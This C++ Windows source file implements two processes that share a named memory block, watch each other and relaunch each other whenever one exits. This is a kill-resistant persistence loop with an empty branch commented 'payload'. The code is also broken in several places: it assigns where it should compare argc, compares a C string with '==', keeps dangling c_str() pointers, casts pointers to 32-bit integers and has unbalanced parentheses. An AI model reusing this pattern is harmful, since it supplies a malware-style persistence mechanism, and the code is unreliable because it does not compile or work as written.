#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <iostream>
#include <string>

std::wstring getPathFromPID(DWORD pid) {
    std::wstring exe_path;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess) {
        WCHAR filename[MAX_PATH];
        DWORD dwSize = GetModuleFileNameW(NULL, filename, MAX_PATH);
        if (dwSize > 0) {
            exe_path = filename;
        }
        CloseHandle(hProcess);
    }
    return exe_path;
}

bool isProcessRunning(DWORD processId) {
    HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, processId);
    if (hProcess != NULL) {
        DWORD exitCode;
        if (GetExitCodeProcess(hProcess, &exitCode) && exitCode == STILL_ACTIVE) {
            CloseHandle(hProcess);
            return true;
        }
        CloseHandle(hProcess);
    }
    return false;
}

bool waitForProcessToExit(DWORD processId) {
    HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, processId);
    if (hProcess != NULL) {
        DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
        CloseHandle(hProcess);
        return (waitResult == WAIT_OBJECT_0);
    }
    return false;
}

int main(int argc, char* argv[])
{

    HANDLE file = CreateFile((std::string("C:/Users/tt/Downloads/")+std::to_string(GetCurrentProcessId())+std::string(" .txt")).c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
    //CloseHandle(file);

    int myNum=0;
    if(argc=1){
        //user
    }else if(argv[1]=="update"){
        //payload
        return 0;
    }else{
        myNum=std::stoi(argv[1]);
    }

    WriteFile(file, "\nmaking mem", strlen("\nmaking mem"), NULL, NULL);

    HANDLE shm_handle  = CreateFileMappingW(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,8,L"JrRKULBcTr");
    void* shm_ptr = MapViewOfFile(shm_handle,FILE_MAP_ALL_ACCESS,0,0,8);
    

    if(isProcessRunning(*reinterpret_cast<DWORD*>(static_cast<uint32_t*>(shm_ptr)+(myNum*4)))){
        WriteFile(file, "\nalready running", strlen("\already running"), NULL, NULL);
        return 0;
    }

    *reinterpret_cast<DWORD*>(static_cast<uint32_t*>(shm_ptr)+(myNum*4))=GetCurrentProcessId();

    char* a;


    char path[MAX_PATH];
    char* meStr;

    // STARTUPINFO startupInfo;
    // PROCESS_INFORMATION processInfo;
    // ZeroMemory(&startupInfo, sizeof(startupInfo));
    // startupInfo.cb = sizeof(startupInfo);

    // CreateProcessA(NULL, (getPathFromPID(GetCurrentProcessId())+std::string(" 1")).c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

    // DWORD childPid = processInfo.dwProcessId;

    WriteFile(file, "\npath", strlen("\npath"), NULL, NULL);//

    GetModuleFileNameA(NULL, path, MAX_PATH);

    WriteFile(file, "\nthis", strlen("\nthis"), NULL, NULL);//

    meStr=const_cast<char*>((std::string(path)+std::string(" ")+std::to_string((myNum+1)%2)).c_str());

    WriteFile(file, "\nstart", strlen("\nstart"), NULL, NULL);//
    


    while(true){
        a=const_cast<char*>((std::string("\n")+std::to_string(reinterpret_cast<uint32_t>(
            static_cast<uint32_t*>(shm_ptr)+(((myNum+1)%2)*4)
            ))).c_str());

        WriteFile(file, a, strlen(a), NULL, NULL);
        while(isProcessRunning(reinterpret_cast<DWORD>(static_cast<uint32_t*>(shm_ptr)+(((myNum+1)%2)*4)))))){
        }

        
        WriteFile(file, "\nmake", strlen("\nmake"), NULL, NULL);


        Sleep(4000);


        STARTUPINFO startupInfo;
        PROCESS_INFORMATION processInfo;
        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);

        CreateProcessA(NULL, meStr, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

    }
}